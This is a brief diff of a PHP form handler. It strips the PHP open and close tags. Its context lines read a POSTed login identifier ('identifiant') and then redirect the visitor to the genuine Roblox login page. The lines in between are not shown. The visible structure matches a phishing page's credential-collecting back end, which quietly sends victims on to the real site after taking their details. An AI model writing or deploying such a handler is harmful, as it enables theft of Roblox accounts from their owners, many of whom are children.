@@ -1,4 +1,4 @@
-<?php
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $identifiant = $_POST['identifiant'];
@@ -13,4 +13,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header("Location: https://www.roblox.com/login");
     exit;
 }
-?>
+
